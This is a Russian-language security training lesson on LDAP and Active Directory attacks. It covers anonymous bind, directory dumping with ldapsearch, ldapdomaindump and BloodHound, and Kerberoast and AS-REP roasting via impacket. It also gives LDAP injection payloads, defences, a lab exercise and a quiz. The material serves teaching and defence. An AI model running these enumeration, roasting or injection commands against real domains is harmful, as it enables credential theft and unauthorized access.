---
id: network-ldap-attacks
title: "LDAP-атаки: анонимный bind, дамп каталога и инъекции в фильтры"
category: network
parent: network-nmap-deep
difficulty: medium
order: 3
tags: [network, ldap, active-directory, enumeration, injection]
prerequisites: [network-portscan]
useful_for:
  - "Пентест Active Directory"
  - "Red team"
  - "Защита каталогов"
estimated_minutes: 38
summary: "LDAP/AD: анонимный и null-bind, дамп домена, инструменты ldapsearch/windapsearch/ldapdomaindump, LDAP-инъекции и защита каталога."
---

LDAP — язык запросов к каталогу, и в Windows-домене он открывает доступ к **Active Directory**. Даже без учётных данных неправильно настроенный контроллер домена может отдать анонимно список пользователей, групп, компьютеров и даже парольные политики. А если приложение строит LDAP-фильтр из пользовательского ввода без экранирования — получается **LDAP-инъекция**, позволяющая обойти аутентификацию или извлечь данные.

## LDAP и Active Directory

AD хранит объекты в иерархии: `DC=corp,DC=local` → `OU=Users` → объекты (user, group, computer). LDAP-порты:

| Порт | Протокол | Назначение |
|---|---|---|
| 389 | LDAP | Обычный |
| 636 | LDAPS | LDAP поверх TLS |
| 3268 | GC | Global Catalog |
| 3269 | GC-SSL | Global Catalog TLS |

Основные операции: **bind** (аутентификация), **search** (поиск), **compare**, **add/modify/delete** (для аутентифицированных). Анонимный bind — это bind с пустыми кредами; на многих DC он разрешён для базовых операций.

## Анонимный bind и null session

Проверить анонимный доступ:

```bash
ldapsearch -x -H ldap://10.0.0.10 -b "dc=corp,dc=local" -s base
# -x = simple auth (анонимно), -b = base DN
```

Если вернулся корневой объект — анонимный bind работает. Далее можно вытащить:

```bash
# Список пользователей
ldapsearch -x -H ldap://10.0.0.10 -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName
# Парольная политика домена
ldapsearch -x -H ldap://10.0.0.10 -b "dc=corp,dc=local" -s base "(objectClass=domainDNS)" \
  minPwdLength lockoutThreshold lockoutDuration
```

Настройка, разрешающая анонимный доступ, называется **dSHeuristics** или DACL на `NTDS Settings`; по умолчанию в свежих доменах он ограничен, но исторически включён.

## Инструменты

- **ldapsearch** (openldap-clients) — низкоуровневые запросы.
- **ldapdomaindump** — дампит весь домен в HTML/JSON/grep-формате.
- **windapsearch** — удобные запросы к AD (пользователи, группы, компьютеры).
- **ldeep** — LDAP-инструмент для AD.
- **BloodHound + SharpHound/bloodhound.py** — граф прав.
- **enum4linux-ng** — комбинированный enum (SMB+LDAP).

```bash
# Дамп домена анонимно или под кредами
ldapdomaindump -u 'corp\\user' -p 'pass' ldap://10.0.0.10 -o dump/
# windapsearch: только пользователи
python3 windapsearch.py --dc-ip 10.0.0.10 -u '' -p '' --users
# BloodHound (python collector) для графа
bloodhound-python -u user -p pass -d corp.local -ns 10.0.0.10 -c All
```

## Разобранный пример: дамп и поиск цели

1. Проверяем анонимный bind и извлекаем base DN из корневого DSE:
   ```bash
   ldapsearch -x -H ldap://10.0.0.10 -s base namingcontexts
   # namingcontexts: DC=corp,DC=local
   ```
2. Дамп под доменной учёткой (если есть):
   ```bash
   ldapdomaindump -u 'corp\\j.doe' -p 'Passw0rd!' ldap://10.0.0.10 -o dump/
   ```
   Получаем `domain_users.json`, `domain_groups.json`, `domain_computers.json`.
3. Ищем «вкусные» атрибуты:
   ```bash
   grep -i "description\|info\|comment" dump/domain_users.json | grep -i "pass\|pwd"
   ```
   Часто пароли лежат в полях `description` или `info`.
4. Ищем Kerberoastable-пользователей (SPN) и AS-REP roastable (без предаутентификации):
   ```bash
   # под кредами — через impacket
   impacket-GetUserSPNs corp.local/j.doe:Passw0rd! -dc-ip 10.0.0.10 -request
   impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.10
   ```
5. Строим граф BloodHound и ищем путь к Domain Admin.

## LDAP-инъекция в приложениях

Если веб-приложение собирает фильтр так:

```java
String filter = "(uid=" + userInput + ")";
```

то ввод `*)(uid=*))(|(uid=*` даёт фильтр `(uid=*)(uid=*))(|(uid=*))`, который может вернуть всех пользователей, а ввод `admin)(&)` — обойти проверку. Классические пейлоады:

- `*` — wildcard, вернёт всё;
- `admin)(|(password=*` — обход;
- `*)(objectClass=*` — извлечение объектов.

Экранирование должно заменять `*`, `(`, `)`, `\`, NUL. Проверять через логин-формы, поиск по каталогу, API.

## Kerberoast и AS-REP через LDAP

LDAP даёт список SPN (для Kerberoasting) и флаг `DONT_REQ_PREAUTH` (для AS-REP roasting):

```bash
# AS-REP roastable пользователи (UAC с флагом 0x400000)
ldapsearch -x -H ldap://10.0.0.10 -b "dc=corp,dc=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```

Дальше — `GetNPUsers`/`GetUserSPNs`, затем hashcat (`-m 18200` для AS-REP, `-m 13100` для Kerberoast). Подробнее — в AD-playbook.

## Защита

| Мера | Против чего |
|---|---|
| Запрет анонимного bind | Дамп каталога без кредов |
| LDAP signing + channel binding | Релеинг LDAP |
| LDAPS (636) везде | Прослушка и MITM |
| Экранирование ввода в приложениях | LDAP-инъекции |
| Минимизация атрибутов с паролями | Утечка через description/info |
| Сильные пароли + managed service accounts | Kerberoast/AS-REP |
| Мониторинг аномальных запросов | Детект enum |

## Частые ошибки и подводные камни

- **Путать base DN.** Неверный `-b` даёт «no such object»; сначала возьмите `namingcontexts`.
- **Забывать про Global Catalog (3268).** Через него видны объекты всего леса, а не только домена.
- **Игнорировать LDAPS-сертификат.** При LDAPS-проверке может потребоваться `-o TLS_REQCERT never`.
- **Пытаться LDAP-инъекцию там, где фильтр уже экранируется.** Сначала проверьте поведение на `*`.
- **Считать enum «шумным» и пропускать.** Анонимный дамп часто не логируется как атака.
- **Путать LDAP bind и Kerberos.** Это разные механизмы аутентификации.

## Что дальше / решение

LDAP — вход в AD-энумерацию; далее `network-kerberos`, `network-ntlm-relay` и AD-playbook (BloodHound, Kerberoast, delegation, ADCS). Для защиты: запретите анонимный bind, включите signing/channel binding, используйте LDAPS и следите за атрибутами, где могут лежать пароли. Для CTF потренируйтесь в `ldapsearch`-запросах с фильтрами и в построении графа BloodHound.

## Справочная таблица

| Инструмент | Назначение |
|---|---|
| ldapsearch | Низкоуровневые запросы |
| ldapdomaindump | Дамп домена в файлы |
| windapsearch | Удобные AD-запросы |
| bloodhound-python | Сбор графа прав |
| enum4linux-ng | Комбинированный enum |

| Порт | Протокол |
|---|---|
| 389 | LDAP |
| 636 | LDAPS |
| 3268 | Global Catalog |
| 3269 | GC over TLS |

## Расширенный синтаксис фильтров LDAP

LDAP-фильтры — это язык; понимание синтаксиса резко расширяет возможности энумерации. Основные операторы:

- `(attr=value)` — равенство;
- `(&(a=1)(b=2))` — логическое И;
- `(|(a=1)(b=2))` — логическое ИЛИ;
- `(!(a=1))` — отрицание;
- `(attr=*)` — наличие атрибута;
- `(attr>=value)` / `(attr<=value)` — сравнение.

Для AD особенно полезен **bitwise-фильтр** `(userAccountControl:1.2.840.113556.1.4.803:=N)`: он проверяет установленный бит в `userAccountControl`. Примеры:

```bash
# Пользователи с включённым аккаунтом
ldapsearch ... "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"
# Все компьютеры-серверы (флаг SERVER_TRUST_ACCOUNT)
ldapsearch ... "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
# Пользователи с паролем, не истекающим никогда (DONT_EXPIRE_PASSWD)
ldapsearch ... "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"
```

Также ищут объекты с `servicePrincipalName` (Kerberoast), `msDS-AllowedToDelegateTo` (делегирование), `adminCount=1` (привилегированные), `userPassword`/`unicodePwd` (редко, но бывает). Эти запросы — основа автоматизации в BloodHound и `ldapdomaindump`.

## Лаборатория: enum и инъекция

1. Поднимите Windows Server с AD DS в изолированной сети (или `GOAD`/`DetectionLab`).
2. Проверьте анонимный bind: `ldapsearch -x -H ldap://<dc> -s base namingcontexts`.
3. Соберите граф: `bloodhound-python -u user -p pass -d corp.local -ns <dc> -c All`, импортируйте в BloodHound.
4. Запустите веб-приложение с уязвимым LDAP-фильтром (специальные лабы, например `DVNA`/`LDAP-injection` стенды) и попробуйте `*)(uid=*))(|(uid=*`.
5. Исправьте: экранируйте `*()\` NUL и повторите — инъекция должна пропасть.

Это даёт полный спектр: анонимный доступ, дамп, граф прав и инъекция.

## Квиз

```quiz
- question: "Что даёт анонимный bind к контроллеру домена?"
  options:
    - "Права администратора"
    - "Возможность читать часть каталога без учётных данных"
    - "Расшифровку Kerberos"
    - "Доступ к SMB"
  answer: 1
  explanation: "Анонимный bind позволяет выполнять разрешённые read-операции каталога без кредов."
- question: "На каком порту LDAP работает поверх TLS?"
  options:
    - "389"
    - "636"
    - "3268"
    - "88"
  answer: 1
  explanation: "LDAPS — это LDAP поверх TLS на порту 636."
- question: "Какой символ в LDAP-фильтре работает как wildcard?"
  options:
    - "%"
    - "*"
    - "?"
    - "#"
  answer: 1
  explanation: "Звёздочка * — wildcard в LDAP-фильтрах, поэтому её нужно экранировать."
- question: "Что ищут в LDAP для AS-REP roasting?"
  options:
    - "SPN у сервисных аккаунтов"
    - "Флаг DONT_REQ_PREAUTH (userAccountControl 4194304)"
    - "Поле description"
    - "Порт 636"
  answer: 1
  explanation: "Аккаунты без обязательной предаутентификации уязвимы к AS-REP roasting."
- question: "Какая мера защищает LDAP от релеинга?"
  options:
    - "Анонимный bind"
    - "LDAP signing и channel binding"
    - "Global Catalog"
    - "Порт 389"
  answer: 1
  explanation: "LDAP signing и channel binding не дают релеить аутентификацию."
```

## Где пригодится

- **Пентест AD:** энумерация пользователей, групп, SPN, поиск пути к DA.
- **Red team:** сбор данных без кредов (анонимный bind) и с минимальными кредами.
- **Работа/SOC:** аудит настроек каталога, детект аномальных LDAP-запросов.
- **Сертификации:** CRTP/OSEP — AD-энумерация и атаки.
